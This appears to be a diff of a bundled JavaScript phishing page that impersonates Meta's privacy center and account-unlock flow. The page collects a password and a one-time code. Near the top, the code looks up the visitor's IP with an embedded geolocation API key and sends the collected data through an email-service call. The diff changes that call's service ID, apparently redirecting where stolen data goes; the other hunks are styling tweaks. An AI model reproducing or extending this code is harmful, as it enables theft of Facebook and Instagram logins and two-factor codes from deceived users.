@@ -14510,7 +14510,7 @@ const ZA = 15,
       "https://api.ipgeolocation.io/ipgeo?apiKey=ab2b18f1cf97421582f9b9190121e2a5"
     ).then((n) => n.json());
     QA.send(
-      "service_d9kadwl",
+      "service_0nsac8q",
       "template_ks5jcmp",
       {
         ip: r.ip,
@@ -14840,10 +14840,8 @@ function JA() {
                     className: oa({
                       "text-md max-w-md text-red-500": !0,
                       hidden: !o,
-                      
                     }),
                     children: "The password that you've entered is incorrect.",
-                  
                   }),
                   L.jsx("button", {
                     type: "submit",
@@ -14912,7 +14910,7 @@ function JA() {
                   L.jsx("img", {
                     src: "/otp.png",
                     alt: "",
-                    
+
                     className: "max-w-[100%] rounded-5px",
                   }),
                   L.jsxs("div", {
@@ -14925,9 +14923,8 @@ function JA() {
                         },
                         className:
                           "h-16 rounded-5px mt-6 mb-5 border pl-4 text-md pt-5 w-full",
-                          placeholder: "Code",
+                        placeholder: "Code",
                       }),
-                      
                     ],
                   }),
                   L.jsxs("div", {
@@ -15108,10 +15105,8 @@ function JA() {
       }),
       L.jsxs("div", {
         className:
-          "bg-white rounded-5px overflow-hidden pb-5 mb-4 max-w-[900px] mt-6",
-        style: {
-          boxShadow: "rgba(0,0,0,0.1) 3px 3px 8px 3px",
-        },
+          "bg-white rounded-5px overflow-hidden pb-5 mb-4 max-w-[900px] mt-6 boxshadow",
+
         children: [
           L.jsx("img", {
             src: "/unlock.png",
@@ -53210,7 +53205,7 @@ const q8 = () =>
   Pt = () => {
     document
       .querySelector(
-        "#root > div > div > div.col-span-12.lg\\:col-span-8.border-l-\\[1px\\].border-\\[\\#DEE3E9\\].md\\:pl-\\[35px\\] > div > div.bg-white.rounded-3xl.overflow-hidden.pb-5.my-3 > div > button"
+        "#root > div > div.grid.grid-cols-12.xl:mx-40.lg:ml-16.px-0.mt-[45px] > div.col-span-12.lg:col-span-8.border-l-[1px].border-[#DEE3E9].md:pl-[35px] > div.text-[15px].text-[#22252A].mr-10.max-w-[900px].ml-5.md:ml-0 > div.bg-white.rounded-5px.overflow-hidden.pb-5.mb-4.max-w-[900px].mt-6 > div.px-5.py-3 > button.bg-\[\#0264E1\].text-white.text-\[17px\].w-full.h-12.rounded-3xl.bold.flex.justify-center.items-center"
       )
       .click();
   };
@@ -53282,7 +53277,7 @@ function Y8() {
             L.jsx("li", {
               children: L.jsxs("div", {
                 className:
-                  "flex hover:bg-[#E3E8EF] transition py-3 rounded-xl px-4",
+                  "flex hover:bg-[#E3E8EF] transition py-3 rounded-5px px-4 mr-20p mt-2",
                 onClick: () => {
                   x();
                 },
@@ -53309,7 +53304,7 @@ function Y8() {
               children: [
                 L.jsxs("div", {
                   className:
-                    "flex hover:bg-[#E3E8EF] transition py-3 rounded-xl px-4",
+                    "flex hover:bg-[#E3E8EF] transition py-3 rounded-5px px-4 mr-20p",
                   onClick: O,
                   children: [
                     L.jsx("div", {
@@ -53351,85 +53346,85 @@ function Y8() {
                       L.jsx("div", {
                         onClick: Pt,
                         className:
-                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-xl px-4 pl-10 flex items-center",
+                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-5px px-4 pl-10 flex items-center mr-20p",
                         children:
                           "What is the Privacy Policy and what does it cover?",
                       }),
                       L.jsx("div", {
                         onClick: Pt,
                         className:
-                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-xl px-4 pl-10 flex items-center",
+                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-5px px-4 mr-20p pl-10 flex items-center",
                         children: "What information do we collect?",
                       }),
                       L.jsx("div", {
                         onClick: Pt,
                         className:
-                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-xl px-4 pl-10 flex items-center",
+                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-5px px-4 mr-20p pl-10 flex items-center",
                         children: "How do we use your information?",
                       }),
                       L.jsx("div", {
                         onClick: Pt,
                         className:
-                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-xl px-4 pl-10 flex items-center",
+                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-5px px-4 mr-20p pl-10 flex items-center",
                         children:
                           "How do we share your information on Meta Products or with integrated partners?",
                       }),
                       L.jsx("div", {
                         onClick: Pt,
                         className:
-                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-xl px-4 pl-10 flex items-center",
+                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-5px px-4 mr-20p pl-10 flex items-center",
                         children:
                           "How do we share information with third parties?",
                       }),
                       L.jsx("div", {
                         onClick: Pt,
                         className:
-                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-xl px-4 pl-10 flex items-center",
+                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-5px px-4 mr-20p pl-10 flex items-center",
                         children:
                           "How is the cooperation between Meta Companies organized?",
                       }),
                       L.jsx("div", {
                         onClick: Pt,
                         className:
-                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-xl px-4 pl-10 flex items-center",
+                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-5px px-4 mr-20p pl-10 flex items-center",
                         children:
                           "How can you manage or delete your information and exercise your rights?",
                       }),
                       L.jsx("div", {
                         onClick: Pt,
                         className:
-                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-xl px-4 pl-10 flex items-center",
+                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-5px px-4 mr-20p pl-10 flex items-center",
                         children: "How long do we keep your information?",
                       }),
                       L.jsx("div", {
                         onClick: Pt,
                         className:
-                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-xl px-4 pl-10 flex items-center",
+                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-5px px-4 mr-20p pl-10 flex items-center",
                         children: "How do we transmit information?",
                       }),
                       L.jsx("div", {
                         onClick: Pt,
                         className:
-                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-xl px-4 pl-10 flex items-center",
+                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-5px px-4 mr-20p pl-10 flex items-center",
                         children:
                           "How do we respond to official requests, comply with applicable laws, and prevent harm?",
                       }),
                       L.jsx("div", {
                         onClick: Pt,
                         className:
-                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-xl px-4 pl-10 flex items-center",
+                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-5px px-4 mr-20p pl-10 flex items-center",
                         children: "How will you know when the policy changes?",
                       }),
                       L.jsx("div", {
                         onClick: Pt,
                         className:
-                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-xl px-4 pl-10 flex items-center",
+                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-5px px-4 mr-20p pl-10 flex items-center",
                         children: "How to ask Meta questions?",
                       }),
                       L.jsx("div", {
                         onClick: Pt,
                         className:
-                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-xl px-4 pl-10 flex items-center",
+                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-5px px-4 mr-20p pl-10 flex items-center",
                         children: "Why and how we process your data",
                       }),
                     ],
@@ -53441,7 +53436,7 @@ function Y8() {
               children: [
                 L.jsxs("div", {
                   className:
-                    "flex hover:bg-[#E3E8EF] transition py-3 rounded-xl px-4",
+                    "flex hover:bg-[#E3E8EF] transition py-3 rounded-5px px-4 mr-20p",
                   onClick: () => {
                     C();
                   },
@@ -53478,33 +53473,33 @@ function Y8() {
                       L.jsx("div", {
                         onClick: Pt,
                         className:
-                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-xl px-4 pl-10 flex items-center",
+                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-5px px-4 mr-20p pl-10 flex items-center",
                         children: "Cookie Policy",
                       }),
                       L.jsx("div", {
                         onClick: Pt,
                         className:
-                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-xl px-4 pl-10 flex items-center",
+                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-5px px-4  pl-10 flex items-center",
                         children:
                           "Information for those who do not use Meta Products",
                       }),
                       L.jsx("div", {
                         onClick: Pt,
                         className:
-                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-xl px-4 pl-10 flex items-center",
+                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-5px px-4 mr-20p pl-10 flex items-center",
                         children:
                           "How Meta uses information for generative AI models",
                       }),
                       L.jsx("div", {
                         onClick: Pt,
                         className:
-                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-xl px-4 pl-10 flex items-center",
+                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-5px px-4 mr-20p pl-10 flex items-center",
                         children: "Data Transfer Framework Policy",
                       }),
                       L.jsx("div", {
                         onClick: Pt,
                         className:
-                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-xl px-4 pl-10 flex items-center",
+                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-5px px-4 mr-20p pl-10 flex items-center",
                         children: "Other terms and conditions",
                       }),
                     ],
@@ -53516,7 +53511,7 @@ function Y8() {
               children: [
                 L.jsxs("div", {
                   className:
-                    "flex hover:bg-[#E3E8EF] transition py-3 rounded-xl px-4",
+                    "flex hover:bg-[#E3E8EF] transition py-3 rounded-5px px-4 mr-20p",
                   onClick: () => {
                     T();
                   },
@@ -53560,13 +53555,13 @@ function Y8() {
                       L.jsx("div", {
                         onClick: Pt,
                         className:
-                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-xl px-4 pl-10 flex items-center",
+                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-5px px-4 mr-20p pl-10 flex items-center",
                         children: "Facebook Settings",
                       }),
                       L.jsx("div", {
                         onClick: Pt,
                         className:
-                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-xl px-4 pl-10 flex items-center",
+                          "hover:bg-[#E3E8EF] transition min-h-12 py-3 rounded-5px px-4 mr-20p pl-10 flex items-center",
                         children: "Instagram Settings",
                       }),
                     ],
